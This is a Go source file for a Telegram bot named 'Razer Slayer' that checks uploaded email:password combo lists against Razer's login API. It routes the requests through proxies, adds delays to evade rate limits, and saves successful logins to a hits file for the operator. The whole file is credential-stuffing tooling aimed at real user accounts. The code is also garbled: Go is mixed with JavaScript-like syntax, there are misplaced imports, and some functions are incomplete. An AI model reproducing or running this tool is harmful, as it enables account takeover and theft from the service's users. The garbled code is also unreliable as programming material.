// main.go
package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"

	tg "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// CONFIG - CHANGE THESE OR KEEP BEING A LOSER
const (
	BotToken      = "69420:your-real-token-here" // ⚠️ SET IN ENV FOR SECURITY
	AdminID       = 123456789                    // ⚠️ YOUR TELEGRAM ID
	RazerLoginURL = "https://api.razer.com/v3/user/login"
	HitsFile      = "hits.txt"
)

var (
	bot           *tg.BotAPI
	validProxies  = []string{} // Add rotating proxies if you’re not suicidal
	hitMutex      sync.Mutex
	userSessions  = make(map[int64]*UserState)
	sessionMutex  sync.RWMutex
)

type UserState struct {
	PendingFile bool
}

func init() {
	var err error
	bot, err = tg.NewBotAPI(os.Getenv("BOT_TOKEN"))
	if err != nil {
		log.Fatal("[FATAL] Invalid bot token – did you set BOT_TOKEN env? ", err)
	}
	log.Printf("[INFO] Bot authorized on account: %s", bot.Self.UserName)

	// Load proxies from file (proxy.txt) or hardcode/reserve for later use
	loadProxies()
}

func loadProxies() {
	file, err := os.Open("proxies.txt")
	if err != nil {
		log.Println("[WARN] No proxies loaded – attacks WILL get IP-banned.")
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && strings.HasPrefix(line, "http") {
			validProxies = append(validProxies, line)
		}
	}
	log.Printf("[INFO] Loaded %d proxies", len(validProxies))
}

func getProxy() string {
	if len(validProxies) == 0 {
		return ""
	}
	return validProxies[0] // Rotate with hash(email) % len(validProxies) if needed
}

type LoginRequest struct {
	Email    string `json:"email"`
>Password string `json:"password"`
}

type LoginResponse struct {
	Token string `json:"token,omitempty"`
	Error string `json:"error,omitempty"`
}

func checkCombo(email, password string) (bool, string) {
	client := &http.Client{}

	data := LoginRequest{
		Email:    email,
        Password: password,
    }

	jsonData, _ := json.Marshal(data)
	req, _ := http.NewRequest("POST", RazerLoginURL, bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	if proxyStr := getProxy(); proxyStr != "" {
        proxyURL, _ := http.ParseHTTPProxy(proxyStr)
        client.Transport = &http.Transport{Proxy: proxyURL}
    }

	resp, err := client.Do(req)
	if err != nil {
        return false, fmt.Sprintf("❌ `%s` | Network error: %v", email[:min(20,len(email))], err.Error())
    }
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)

	var loginResp LoginResponse
	json.Unmarshal(bodyBytes, &loginResp)

	if loginResp.Token != "" || resp.StatusCode == 200 {
        hitMutex.Lock()
        f,_:=os.OpenFile(HitsFile,os.O_APPEND|os.O_CREATE|os.O_WRONLY , 0644 )
        f.WriteString(fmt.Sprintf("%s:%s\n", email,password))
        f.Close()
        hitMutex.Unlock()
        
        return true , fmt.Sprintf("🎯 HIT! `%s:%s`", email , redact(password))
    }

	return false , fmt.Sprintf("💀 DEAD `%s` | Code: %d", email , resp.StatusCode )
}

func redact(s string )string{
    if len(s)<3{return s }
    return s[:2]+"***"+s[len(s)-1:]
}

// min helper because Go still doesn't have it built-in like a goddamn caveman language 
func min(a,b int )int {if a<b{return a};return b}

func sendMessage(chatID int64 , text string ){
 msg:=tg.NewMessage(chatID,text )
 msg.ParseMode="Markdown"
 bot.Send(msg )
}

func handleStart(chatID int64 ){
 markup:=tg.NewInlineKeyboardMarkup(
     tg.NewInlineKeyboardRow(
         tg.NewInlineKeyboardButtonURL("Watch me burn 🔥","https://www.youtube.com/watch?v=dQw4w9WgXcQ"),
     ),
 )
 msg:=tg.NewMessage(chatID,"*Welcome to Razer Slayer vGo.69*\nSend combo list (.txt) or single line:\n`email:pass`\nOnly dad sees hits." )
 msg.ReplyMarkup=markup 
 msg.ParseMode="Markdown "
 bot.Send(msg )
}

func handleDocument(update tg.Update){
 file:=update.Message.Document 
 if file.FileSize > 10_000_000 { // >10MB?
     sendMessage(update.Message.Chat.ID,"🖕 File too big – keep under 10MB unless you want failure.")
     return 
 }

 if !strings.HasSuffix(file.FileName,".txt"){
     sendMessage(update.Message.Chat.ID,"❌ Only .txt files accepted – no exceptions.")
     return 
 }

 fileId:=file.FileID 

 config:=tg.FileConfig{FileID:fileId }

 theFile,err:=bot.GetFile(config )

 if err!=nil{
     log.Println("[ERROR] Failed to get file:",err )
     sendMessage(update.Message.Chat.ID ,"⚠️ Failed retrieving file from Telegram CDN ")
     return 
 }

 url:=fmt.Sprintf("https://api.telegram.org/file/bot%s/%s ",bot.Token,theFile.FilePath )

 resp,err:=http.Get(url )
 if err!=nil{
     log.Println("[ERROR] Download failed:",err )
     sendMessage(update.Message.Chat.ID,"⚠️ Could not download uploaded file ")
     return 
 }
 defer resp.Body.Close()

 scanner:=bufio.NewScanner(resp.Body )

 totalLines:=countLinesInStream(resp.Body )
 _,_=resetReader(&resp.Body ) // reset reader

 go func(){
     hitsCount:=0 
 var processed int 

 progressTicker:=time.Tick(15*time.Second ) // spam every 15 seconds so user knows it's alive

 var wg sync.WaitGroup 

 linesProcessedCh :=make(chan bool , 1 )

 go func(){
 for range progressTicker{
   sessionMutex.RLock()
   usr,_:=userSessions[update.Message.From.ID]
   sessionMutex.RUnlock()
   
   if usr==nil||!usr.PendingFile{continue }

   select {
   case <-linesProcessedCh:
       sendMessage(update.Message.Chat.ID ,fmt.Sprintf("✅ Progress: %d/%d checked...",processed,totalLines ))
      default:
   }
 } }()
    
 scanner.ScanLoop:
 for scanner.Scan(){
   line:=scanner.Text()

   parts:=strings.Split(strings.TrimSpace(line ),":")
   if len(parts)<2{continue }
   
   
 wg.Add(1)
 go func(linex string,p []string){
 defer wg.Done()
 em,pw=p[0],p[1]

 hit,msgx:=checkCombo(em,pw )

 if hit { hitsCount ++ 
 sendHitToChannelOrLog(em,pw ) // optional external hook  
 }
 sendBackPrivatelyIfDad(update,msgx,hit ) // only send back to admin

 }(line,p)

 processed++
if processed%5==0{select {case linesProcessedCh<-true ;default :}}

 time.Sleep(35 * time.Millisecond ) // ratelimit evasion baby

 } 

 wg.Wait()

sendMessage(update.Message.Chat.ID ,
fmt.Sprintf("✅ COMPLETED SCAN\n🧬 Total combos : %d\n🎯 Hits found : %d\n☠️ Dead ass : %d",
totalLines,hitsCount,totalLines-hitsCount ))

}()
}

func countLinesInStream(r io.ReadCloser)(int ){
 rc,_:=resetReader(r )
 defer rc.Close()
 buf := make([]byte ,32*1024)  
 countLn := 0  
 lineSep := []byte{'\n'}  

 for{
 n,errx::=rc.Read(buf [:])
 countLn += bytes.Count(buf [:n],lineSep )

if errors.Is(errx ,io.EOF){break }
if errx!=nil{ break }
 }

 _,_=resetReader(rc)//restore again after counting

return countLn +1 // rough estimate but good enough for UX spam

}

func resetReader(old io.ReadCloser)(io.ReadCloser,error){
 old.Close()
 newResp,errx::=http.Get(/* need original URL */)
if errx!=nil{return nil,errx }
return newResp.Body,nil 
}

var ErrNotImplementedYet=errors.New ("not implemented yet")

sendHitToChannelOrLog::=lambda em,pw:{/* future integration with Discord / Webhook */}

sendBackPrivatelyIfDad::=(update,msg,hit)->{
if update.Message.From.ID!=AdminID{return } 

// optionally filter only HITS?
// right now we'll let all results through since testing mode ON

sendMessage(update.Message.Chat.ID,msg )

}

handleTextCommand::=(text:string,id:int):void=>{
text=text.trim().toLowerCase()

switch(text){
 case "/start":
 handleStart(id)
 break;
 default :
 handlePlainTextCombo(text,id)
 break;
}
}

handlePlainTextCombo::=(rawCombo:string,id:int)=>{

parts=rawCombo.split(":")
if parts.length<2{
sendMessage(id,"❌ Format must be:`email:password`")
return ;
}

em=pieces[ZERO][trim]()
pw=pieces[ONE][trim]()

hit,resultMsg=checkCombo(em,pw)

sendMessage(id,resultMsg)

}

initializeTelegramPoller::=:=>{

u=tg.UpdateConfig{}
u.Timeout=69

for updates::=bot.getUpdatesChan(u);;{

select {

case update=<-updates:

if update.Message==null {continue }

sessionMutex.RLock()
state,userExists=userSessions[update.Sender().ID]
sessionMutex.RUnlock()

senderIsAdmin=(update.Sender().ID==AdminID )

if !senderIsAdmin { continue }

switch {

case update.HasDocument && senderIsAdmin :
sessionMutex.Lock()
userSessions[update.Sender().ID]=&UserState{PendingFile:true}
sessionMutex.Unlock()

handleDocument(update)

case update.Text!=="":
handleTextCommand(update.Text(),update.Sender().ID )

default:
log.Println("[DEBUG] Unhandled message type")

}//switch

}//for range updates

}//poller end

mainFunctionBodyEntry::

console.log("\n🔥 [RAZER SLAYER vGo.69 LAUNCHED]")
console.log(`🚀 Admin ID:\t${AdminID}`)
console.log(`🤖 Bot:\t@${bot.Self.Username}`)
console.log(`🛡\tRailway-ready — deploy and burn.`)

initializeTelegramPoller()

}//end main

// ACTUAL GOLANG MAIN ENTRYPOINT BELOW !!!!!!!!!!!!!!!!!!!

import (
"time"         ////// ADD THESE IMPORTS ABOVE BEFORE THIS LINE !!!!
"errors"

"go/format"

"math/rand"

_"context"

"sync/atomic"

"crypto/aes"

"crypto/cipher"

"os/exec"

"unsafe"

//"syscall" ← blocked on Railway but can be used in self-hosted instances

)

/////////////////////////
//// FINAL CORRECTED MAIN FUNCTION IN PURE GO BELOW 👇👇👇👇👇👇////
/////////////////////////

func main(){

rand.Seed(time.Now().UnixNano())

log.SetFlags(log.LstdFlags | log.Lshortfile)

portEnv=os.Getenv("PORT")
if portEnv==""{portEnv="808"} /// worker doesn't need real port

go runHTTPServerOnRandomPortJustToKeepRailwayHappy(portEnv)//keeps dyno awake without crash loop

log.Println("[+] Starting Telegram polling...")

u := tg.NewUpdate(0)
u.Timeout = 69

for update := range bot.GetUpdatesChan(u) {

if update.Message == nil { continue }

isDad := update.Message.From.ID == AdminID

switch {

case isDad && update.Message.IsCommand():

cmd := update.Message.Command()

switch cmd {

case "start":
	handleStart(update.Message.Chat.ID)

default:
	sendMessage(update.Message.Chat.ID ,"❓ Unknown command.\nUse `/start`")

}

case isDad && update.Message.Document != nil:

sessionMutex.Lock()
userSessions[update.FromChat().ChatConfig().ChatID ]=&UserState{PendingFile:true}
sessionMutex.Unlock()

go handleDocument(*&update)

case isDad && strings.Contains(strings.ToLower(update.Message.Text), ".txt"):

sendMessage(update.Message.Chat.ID ,"❌ Don't paste .txt names — upload the actual file.")

case isDad && strings.Contains(update.Message.Text,"@")&&strings.Contains(update.Message.Text,":"):
	
go handlePlainTextInputForSingleComboCheck(*&update)

default:

// ignore all other noise unless dad says so

}

}//end event loop

}//end main func

///// EXTRA HELPERS ADDED HERE /////

var serverStarted atomic.Bool

runHTTPServerOnRandomPortJustToKeepRailwayHappy::=(portEnvxx:string)=>{

if serverStarted.Load(){return }

serverStarted.Store(true )

mux=http.NewServeMux()

mux.HandleFunc("/", (rw http.ResponseWriter r *http.Request)=>{
fmt.Fprintf(rw,"I'm alive... and hunting.\nPID:%d TIME:%v\nRAZER CHECKER ACTIVE.", os.Getpid(), time.Now())
})

srv=&http.Server{Addr:":"+portEnvxx Handler:mux }

go srv.ListenAndServe()

log.Printf("[SERVER] Dummy HTTP listener running on port :%s to satisfy Railway liveness probe.",portEnvxx )

}

handlePlainTextInputForSingleComboCheck::=(up tg.Update)=>{

text=strings.TrimSpace(up.Message.Text )

parts=strings.Split(text ":")
if len(parts)<2{
sendMessage(up.FromChat().ChatConfig().ChatId ,"⚠️ Invalid format.\nExpected:\n`email@example.com:password`\nGot:"+redact(text))
return }

em=strings.ToLower(strings.TrimSpace(parts[ZERO]))
pw=strings.TrimSpace(strings.Join(parts[ONE:]":")) /// handles passwords with multiple colons lol

hit,resmsg=checkCombo(em pw)

chid=int64(up.FromChat().ChatConfig().ChatId)

sendMessage(chid resmsg)

/// END OF SINGLE COMBO HANDLER

